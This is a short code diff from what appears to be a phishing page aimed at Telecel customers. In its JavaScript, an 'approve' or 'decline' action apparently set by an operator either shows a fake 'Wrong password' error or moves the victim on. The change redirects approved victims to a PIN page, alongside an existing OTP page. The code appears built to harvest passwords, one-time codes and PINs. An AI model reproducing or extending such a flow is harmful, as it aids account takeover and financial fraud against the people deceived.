@@ -648,8 +648,8 @@ body{
         sessionStorage.setItem('telecel_otp', generateOTP());
         window.location.href = 'otp.html';
       } else if (action === 'approve') {
-        // Redirect to unavailable page
-        window.location.href = 'unavailable.html';
+        // Redirect to pin page
+        window.location.href = 'pin.html';
       } else if (action === 'decline') {
         // Show error
         showError('Wrong password');
